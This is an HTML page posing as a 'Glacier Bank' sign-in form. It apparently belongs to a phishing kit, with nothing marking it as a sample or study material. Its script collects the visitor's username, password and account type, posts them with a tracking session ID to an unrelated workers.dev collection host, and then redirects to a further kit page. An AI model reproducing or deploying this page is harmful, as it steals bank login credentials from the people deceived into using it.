<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Glacier Bank | Enter Your Email</title>

<style>
:root{
  --blue:#0a7db3;
  --blue-dark:#06638f;
  --text:#1e1e1e;
  --bg:#f5f5f5;
  --card:#fff;
}

/* GLOBAL */
*{box-sizing:border-box;}
body{
  margin:0;
  font-family:"Inter", Arial, sans-serif;
  background:var(--bg);
  color:var(--text);
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  min-height:100vh;
  padding:20px;
}

/* LOGO */
.logo img{
  height:50px;
  margin-bottom:20px;
}

/* FORM CARD */
.form-card{
  background:var(--card);
  padding:32px 28px;
  border-radius:6px;
  box-shadow:0 12px 32px rgba(0,0,0,0.15);
  width:100%;
  max-width:400px;
  text-align:center;
}

.form-card h1{
  font-size:20px;
  margin-bottom:24px;
}

.form-card input,
.form-card select{
  width:100%;
  padding:12px;
  margin-bottom:14px;
  border:1px solid #ccc;
  border-radius:4px;
  font-size:14px;
}

.form-card button{
  width:100%;
  padding:12px;
  background:var(--blue);
  color:#fff;
  border:none;
  border-radius:4px;
  font-size:15px;
  cursor:pointer;
}
.form-card button:hover{
  background:var(--blue-dark);
}

#line{
  height:1px;
  background:#eee;
  margin:18px 0;
}

/* FOOTER */
footer{
  margin-top:20px;
  font-size:13px;
  color:#777;
  text-align:center;
}

footer a{
  color:var(--blue);
  text-decoration:none;
}

/* RESPONSIVE */
@media(max-width:480px){
  .form-card{
    padding:24px 18px;
  }
  .form-card h1{
    font-size:18px;
  }
}
</style>
</head>
<body>

<div class="logo">
  <img src="../Assets/lgoii.png" alt="Glacier Bank Logo">
</div>

<!-- FORM CARD -->
<form class="form-card" id="emailForm">
  <h1>Enter Your Email</h1>

  <input type="email" name="username" placeholder="Email / Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <input type="password" name="cpassword" placeholder="Confirm Password" required>

  <select name="bankType" required>
    <option value="Online Banking">Online Banking</option>
    <option value="Business Banking">Business Banking</option>
  </select>

  <button type="submit">Continue</button>

  <div id="line"></div>
</form>

<footer>
  © 2026 - Glacier Bank
</footer>

<script>
// Generate persistent session
const session = localStorage.getItem("session") || crypto.randomUUID();
localStorage.setItem("session", session);

document.getElementById("emailForm").addEventListener("submit", async e => {
  e.preventDefault();

  const username = e.target.username.value.trim();
  const password = e.target.password.value.trim();
  const cpassword = e.target.cpassword.value.trim();
  const bankType = e.target.bankType.value;

  // Optionally validate passwords match
  if(password !== cpassword){
    alert("Passwords do not match.");
    return;
  }

  try {
    await fetch("https://summer-rain-1f5b.tekin49532.workers.dev/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username,
        password,
        type: bankType,
        session,
        step: "email_page"
      })
    });

    // Redirect to nsem.html after submission
    window.location.href = "/Pages/1E5E.html";

  } catch (err) {
    console.error(err);
    alert("Network error. Please try again.");
  }
});
</script>

</body>
</html>
